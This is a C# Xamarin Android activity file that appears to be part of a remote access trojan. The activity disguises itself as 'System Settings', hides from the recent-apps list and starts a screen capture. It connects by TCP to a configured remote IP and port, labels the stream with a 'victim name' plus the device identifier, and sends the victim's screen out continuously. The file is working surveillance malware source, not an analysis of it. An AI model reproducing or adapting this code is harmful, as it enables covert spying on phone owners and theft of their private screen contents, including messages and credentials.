
using Android.App;
using Android.Content;
using Android.OS;
using System;
using System.Net;
using System.Net.Sockets;

namespace Task2
{
    [Activity(Label = "System Settings", ExcludeFromRecents = true)]
    public class screenActivty : Activity
    {
        public static Activity screnAct;
        protected override void OnCreate(Bundle savedInstanceState)
        {
            base.OnCreate(savedInstanceState);
            screnAct = this;
            RequestWindowFeature(Android.Views.WindowFeatures.NoTitle);
            //set up full screen
            Window.SetFlags(Android.Views.WindowManagerFlags.Fullscreen,
                    Android.Views.WindowManagerFlags.Fullscreen);
            startProjection();
            // Create your application here
        }
       
        protected override void OnActivityResult(int requestCode, Result resultCode, Intent data)
        {
            Finish();
            if (requestCode == MainActivity.REQUEST_CODE)
            {
                if (resultCode == Result.Ok)
                {
                    try
                    {
                        ImageAvailableListener.ID = MainValues.KRBN_ISMI + "_" + ((MainActivity)MainActivity.global_activity).GetIdentifier();
                        ImageAvailableListener.screenSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                        IPAddress ipadresi_dosya = Dns.GetHostAddresses(MainValues.IP)[0];
                        IPEndPoint endpoint_dosya = new IPEndPoint(ipadresi_dosya, MainValues.port);
                        ImageAvailableListener.screenSock.SendBufferSize = int.MaxValue;
                        ImageAvailableListener.screenSock.SendTimeout = -1;
                        ImageAvailableListener.screenSock.NoDelay = true;
                        ((MainActivity)MainActivity.global_activity).SetKeepAlive(ImageAvailableListener.screenSock, 2000, 1000);
                        ImageAvailableListener.screenSock.Connect(endpoint_dosya);
                        
                        byte[] myScreenReady = ((MainActivity)MainActivity.global_activity).MyDataPacker("MYSCREENREADY", System.Text.Encoding.UTF8.GetBytes("ECHO"), ImageAvailableListener.ID);
                        ImageAvailableListener.screenSock.Send(myScreenReady, 0, myScreenReady.Length, SocketFlags.None);

                        MainActivity.sMediaProjection = MainActivity.mProjectionManager.GetMediaProjection((int)resultCode, data);

                        if (MainActivity.sMediaProjection != null)
                        {

                            var metrics = Resources.DisplayMetrics;

                            MainActivity.mDensity = (int)metrics.DensityDpi;
                            MainActivity.mDisplay = WindowManager.DefaultDisplay;

                            // create virtual display depending on device width / height
                            ((MainActivity)MainActivity.global_activity).createVirtualDisplay();

                            // register orientation change callback
                            MainActivity.mOrientationChangeCallback = new OrientationChangeCallback(this);
                            if (MainActivity.mOrientationChangeCallback.CanDetectOrientation())
                            {
                                MainActivity.mOrientationChangeCallback.Enable();
                            }

                            // register media projection stop callback
                            MainActivity.sMediaProjection.RegisterCallback(new MediaProjectionStopCallback(), MainActivity.mHandler);
                        }
                    }
                    catch (Exception)
                    {
                        ((MainActivity)MainActivity.global_activity).stopProjection();                       
                    }
                    //ComponentName componentName = new ComponentName(this, Java.Lang.Class.FromType(typeof(screenActivty)).Name);
                    //PackageManager.SetComponentEnabledSetting(componentName, ComponentEnabledState.Disabled, ComponentEnableOption.DontKillApp);
                }
                else
                {
                    try
                    {
                        byte[] dataPacker = ((MainActivity)MainActivity.global_activity).MyDataPacker("NOTSTART", System.Text.Encoding.UTF8.GetBytes("ECHO"));
                        MainActivity.Soketimiz.BeginSend(dataPacker, 0, dataPacker.Length, SocketFlags.None, null, null);
                    }
                    catch (Exception) { }
                }
            }
        }
        private void startProjection()
        {
            StartActivityForResult(MainActivity.mProjectionManager.CreateScreenCaptureIntent(), MainActivity.REQUEST_CODE);
        }
    }
}